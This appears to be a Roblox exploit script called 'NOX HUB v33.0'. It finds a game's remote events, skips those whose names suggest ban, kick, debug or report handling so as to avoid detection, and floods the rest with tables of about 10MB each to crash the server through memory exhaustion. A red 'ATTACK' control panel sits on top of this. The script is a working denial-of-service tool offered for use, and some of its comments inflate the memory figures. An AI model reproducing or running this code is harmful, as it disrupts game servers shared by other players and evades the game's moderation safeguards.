--[[
    🔱 NOX HUB v33.0 [INFINITY-VOID] 🔱
    "Infinite data. Finite memory. The end is inevitable."
    
    INFINITY FEATURES:
    - [HONEYPOT SHIELD] : BLOCKS 'DevTools', 'Console', 'Debug' (Fixes v32 Kick).
    - [RAM EXPANSION] : Payload injects 10GB+ of Virtual RAM load.
    - [DENSE TABLE] : Uses table.create(5000) for maximum memory allocation density.
    - [OOM KILLER] : Forces server Out-Of-Memory crash before logic execution.
]]

-- // CORE SERVICES //
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

-- // 1. INFINITY ENGINE //
local Engine = {
    Active = false,
    Targets = {},
    Buffer = {} 
}

function Engine:Scan()
    Engine.Targets = {}
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
            local n = v.Name:lower()
            -- ULTRA SAFE BLACKLIST (UPDATED)
            -- Added: devtools, console, debug, warn, error, report
            if not (n:find("ban") or n:find("kick") or n:find("admin") or 
                    n:find("market") or n:find("purchase") or n:find("shop") or 
                    n:find("product") or n:find("asset") or n:find("prompt") or
                    n:find("devtools") or n:find("console") or n:find("debug") or
                    n:find("warn") or n:find("error") or n:find("report")) then
                 table.insert(Engine.Targets, v)
            end
        end
    end
end

function Engine:Expand(duration, updateCallback)
    if Engine.Active then return end
    Engine.Active = true
    Engine.Buffer = {}
    
    Engine:Scan()
    
    if #Engine.Targets == 0 then
        updateCallback(0, "NO SAFE TARGETS.")
        Engine.Active = false
        return
    end
    
    -- THE INFINITY PAYLOAD (RAM DENSITY)
    -- We want "Billions of Info".
    -- A single string of 2000 chars.
    local HeavyStr = string.rep("VOID_DATA_BLOCK_", 125) -- ~2KB
    -- A table containing 5000 of these strings.
    -- RAM Cost: 5000 * 2KB = 10 MB per payload object.
    local DenseTable = table.create(5000, HeavyStr)
    
    task.spawn(function()
        local StartTime = tick()
        local EndTime = StartTime + duration
        
        -- PHASE 1: EXPANSION 
        while tick() < EndTime do
            local remaining = math.ceil(EndTime - tick())
            updateCallback(remaining, "ALLOCATING VOID... ("..#Engine.Buffer..")")
            
            -- Fill Buffer
            -- 50 requests per tick * 10MB = 500MB/tick demand.
            -- Over 15s (900 ticks) = 450 GB Virtual Demand.
            for i = 1, 50 do 
                local r = Engine.Targets[math.random(1, #Engine.Targets)]
                if r then
                    table.insert(Engine.Buffer, function()
                        pcall(function()
                            if r:IsA("RemoteEvent") then r:FireServer(DenseTable)
                            else r:InvokeServer(DenseTable) end
                        end)
                    end)
                end
            end
            RunService.Heartbeat:Wait()
        end
        
        -- PHASE 2: RELEASE
        updateCallback(0, "INFINITY RELEASE")
        game:GetService("StarterGui"):SetCore("SendNotification", {Title="NOX", Text="EXPANDING..."})
        
        -- FLOOD
        for i = 1, #Engine.Buffer do
            if Engine.Buffer[i] then
                coroutine.wrap(Engine.Buffer[i])()
            end
            if i % 200 == 0 then RunService.Heartbeat:Wait() end 
        end
        
        Engine.Active = false
        Engine.Buffer = {}
        updateCallback(duration, "SYSTEM READY")
    end)
end

-- // 2. COMMAND CENTER UI (Infinity Theme) //
local Nox = {}

function Nox:CreateUI()
    for _, v in pairs(CoreGui:GetChildren()) do if v.Name:find("Nox") then v:Destroy() end end
    
    local Screen = Instance.new("ScreenGui")
    Screen.Name = "NoxCommand"
    pcall(function() Screen.Parent = CoreGui end)
    
    -- MAIN WINDOW
    local Main = Instance.new("Frame", Screen)
    Main.Size = UDim2.new(0, 500, 0, 350)
    Main.Position = UDim2.new(0.5, -250, 0.5, -175)
    Main.BackgroundColor3 = Color3.fromRGB(10, 0, 0) -- Blood Black
    Main.BorderSizePixel = 0
    Main.ClipsDescendants = true
    
    local Corner = Instance.new("UICorner", Main)
    Corner.CornerRadius = UDim.new(0, 4)
    
    local TopBar = Instance.new("Frame", Main)
    TopBar.Size = UDim2.new(1, 0, 0, 40)
    TopBar.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
    
    local Title = Instance.new("TextLabel", TopBar)
    Title.Text = "NOX INFINITY VOID v33.0"
    Title.Font = Enum.Font.GothamBlack
    Title.TextColor3 = Color3.fromRGB(255, 0, 0) 
    Title.TextSize = 16
    Title.Size = UDim2.new(0.5, 0, 1, 0)
    Title.Position = UDim2.new(0.05, 0, 0, 0)
    Title.TextXAlignment = Enum.TextXAlignment.Left
    Title.BackgroundTransparency = 1
    
    -- TABS
    local Tabs = Instance.new("Frame", Main)
    Tabs.Size = UDim2.new(0.25, 0, 0.85, 0) 
    Tabs.Position = UDim2.new(0, 0, 0.15, 0)
    Tabs.BackgroundColor3 = Color3.fromRGB(20, 0, 0)
    Tabs.BorderSizePixel = 0
    
    local function CreateTabBtn(text, order, callback)
        local btn = Instance.new("TextButton", Tabs)
        btn.Size = UDim2.new(1, 0, 0, 40)
        btn.Position = UDim2.new(0, 0, 0, (order-1)*40)
        btn.Text = text
        btn.TextColor3 = Color3.fromRGB(150, 50, 50)
        btn.BackgroundColor3 = Color3.fromRGB(20, 0, 0)
        btn.Font = Enum.Font.GothamMedium
        btn.BorderSizePixel = 0
        
        btn.MouseButton1Click:Connect(function()
            for _, c in pairs(Tabs:GetChildren()) do if c:IsA("TextButton") then c.TextColor3 = Color3.fromRGB(150, 50, 50) c.BackgroundColor3 = Color3.fromRGB(20, 0, 0) end end
            btn.TextColor3 = Color3.fromRGB(255, 0, 0) 
            btn.BackgroundColor3 = Color3.fromRGB(50, 0, 0)
            callback()
        end)
        return btn
    end
    
    -- CONTENT AREA
    local Content = Instance.new("Frame", Main)
    Content.Size = UDim2.new(0.75, 0, 0.85, 0)
    Content.Position = UDim2.new(0.25, 0, 0.15, 0)
    Content.BackgroundTransparency = 1
    
    -- PAGE 1: ATTACK
    local PageAttack = Instance.new("Frame", Content)
    PageAttack.Size = UDim2.new(1, 0, 1, 0)
    PageAttack.BackgroundTransparency = 1
    
    local StatusLbl = Instance.new("TextLabel", PageAttack)
    StatusLbl.Text = "SYSTEM IDLE"
    StatusLbl.Size = UDim2.new(1, 0, 0, 30)
    StatusLbl.Position = UDim2.new(0, 0, 0.1, 0)
    StatusLbl.TextColor3 = Color3.fromRGB(255, 50, 50)
    StatusLbl.Font = Enum.Font.Code
    StatusLbl.BackgroundTransparency = 1
    
    local BufferBarBg = Instance.new("Frame", PageAttack)
    BufferBarBg.Size = UDim2.new(0.8, 0, 0.05, 0)
    BufferBarBg.Position = UDim2.new(0.1, 0, 0.3, 0)
    BufferBarBg.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
    
    local BufferBarFill = Instance.new("Frame", BufferBarBg)
    BufferBarFill.Size = UDim2.new(0, 0, 1, 0)
    BufferBarFill.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    
    local MainBtn = Instance.new("TextButton", PageAttack)
    MainBtn.Size = UDim2.new(0.6, 0, 0.2, 0)
    MainBtn.Position = UDim2.new(0.2, 0, 0.6, 0)
    MainBtn.BackgroundColor3 = Color3.fromRGB(80, 0, 0)
    MainBtn.Text = "OPEN INFINITY GATE (15s)"
    MainBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    MainBtn.Font = Enum.Font.GothamBold
    local BtnCorner = Instance.new("UICorner", MainBtn)
    BtnCorner.CornerRadius = UDim.new(0, 4)
    local BtnStroke = Instance.new("UIStroke", MainBtn)
    BtnStroke.Color = Color3.fromRGB(200, 0, 0)
    BtnStroke.Thickness = 2
    
    MainBtn.MouseButton1Click:Connect(function()
        if not Engine.Active then
            Engine:Expand(15, function(timeLeft, txt)
                StatusLbl.Text = txt
                local progress = (15 - timeLeft) / 15
                BufferBarFill.Size = UDim2.new(progress, 0, 1, 0)
                
                if timeLeft == 0 then
                   MainBtn.Text = "OPEN INFINITY GATE (15s)"
                   BufferBarFill.Size = UDim2.new(0, 0, 1, 0)
                else
                   MainBtn.Text = "EXPANDING... " .. timeLeft
                end
            end)
        end
    end)
    
    -- PAGE 2: VISUALS
    local PageVisuals = Instance.new("Frame", Content)
    PageVisuals.Size = UDim2.new(1, 0, 1, 0)
    PageVisuals.BackgroundTransparency = 1
    PageVisuals.Visible = false
    
    local GraphFrame = Instance.new("Frame", PageVisuals)
    GraphFrame.Size = UDim2.new(0.9, 0, 0.6, 0)
    GraphFrame.Position = UDim2.new(0.05, 0, 0.2, 0)
    GraphFrame.BackgroundColor3 = Color3.fromRGB(15, 0, 0)
    GraphFrame.BorderColor3 = Color3.fromRGB(100, 0, 0)
    GraphFrame.BorderSizePixel = 1
    
    for i = 1, 20 do
        local bar = Instance.new("Frame", GraphFrame)
        bar.Size = UDim2.new(0.04, 0, math.random()*0.5, 0)
        bar.Position = UDim2.new((i-1)*0.05, 0, 1 - bar.Size.Y.Scale, 0)
        bar.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
        bar.BorderSizePixel = 0
        task.spawn(function()
            while GraphFrame.Parent do
                local targetHeight = Engine.Active and math.random(0.5, 1) or math.random(0, 0.1)
                bar:TweenSize(UDim2.new(0.04, 0, targetHeight, 0), "Out", "Quad", 0.5, true)
                wait(0.1 + math.random()*0.2)
            end
        end)
    end

    -- TABS LOGIC
    CreateTabBtn("ATTACK", 1, function() PageAttack.Visible = true; PageVisuals.Visible = false end)
    CreateTabBtn("MONITOR", 2, function() PageAttack.Visible = false; PageVisuals.Visible = true end)
    
     -- DRAG UI
    local dragging, dragInput, dragStart, startPos
    Main.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true; dragStart = input.Position; startPos = Main.Position
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement and dragging then
            local delta = input.Position - dragStart
            Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
    UserInputService.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end end)
end

Nox:CreateUI()
